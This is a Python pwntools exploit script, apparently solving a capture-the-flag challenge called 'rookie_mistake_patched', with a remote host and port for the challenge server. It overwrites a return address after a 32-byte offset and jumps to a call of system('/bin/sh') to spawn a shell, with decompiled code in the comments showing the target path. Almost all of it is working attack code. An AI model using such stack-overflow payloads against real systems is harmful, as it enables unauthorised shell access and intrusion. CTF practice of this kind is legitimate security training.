#!/usr/bin/env python3

from pwn import *

e = ELF("./rookie_mistake_patched")

context.binary = e  # Set the target binary for pwntools
context.terminal = ["kitty", "-e"]  # Terminal to use for GDB debugging
HOST = "46.101.244.150"  # Remote host IP
PORT = 31113  # Remote port

gdb_script = """
b main
b *0x0000000000401672
continue
"""

def conn():
    # Start local process with optional GDB or connect to remote
    if args.LOCAL:
        p = process([e.path])
        if args.GDB:
            gdb.attach(p, gdbscript=gdb_script)
    else:
        p = remote(HOST, PORT)
    return p

    # [0x004011b0]> pdg @ sym.overflow_core
    #
    # void sym.overflow_core(ulong param_1,ulong param_2,ulong param_3,ulong param_4,ulong param_5,ulong param_6)
    #
    # {
    #     char cVar1;
    #     
    #     cVar1 = sym.check_core(param_1,_obj.core_0,0);
    #     if (cVar1 != '\0') {
    #         cVar1 = sym.check_core(param_2,_obj.core_1,1);
    #         if (cVar1 != '\0') {
    #             cVar1 = sym.check_core(param_3,_obj.core_2,2);
    #             if (cVar1 != '\0') {
    #                 cVar1 = sym.check_core(param_4,_obj.core_3,3);
    #                 if (cVar1 != '\0') {
    #                     cVar1 = sym.check_core(param_5,_obj.core_4,4);
    #                     if (cVar1 != '\0') {
    #                         cVar1 = sym.check_core(param_6,_obj.core_5,5);
    #                         if (cVar1 != '\0') {
# ->                              sym.imp.system(0x4030a7);
    #                         }
    #                     }
    #                 }
    #             }
    #         }
    #     }
    #     return;
    # }

def main():
    p = conn()  # Establish connection to target

    offset = 32  # Offset to control return address
    
    ret = 0x000000000040101a 
    
    payload = flat({offset: [
            ret,
            0x00401758  # -> JUMP to sym.imp.system("/bin/sh")
            
                        # 0x00401758      488d054819..   lea rax, [0x004030a7]       ; "/bin/sh"
                        # 0x0040175f      4889c7         mov rdi, rax                ; const char *string
                        # 0x00401762      e8b9f9ffff     call sym.imp.system         ; int system(const char *string)

        ]})  # Flatten payload for sending

    p.sendlineafter(b'$', payload) 
    p.interactive()  # Hand over interaction to user for shell or output

if __name__ == "__main__":
    main()

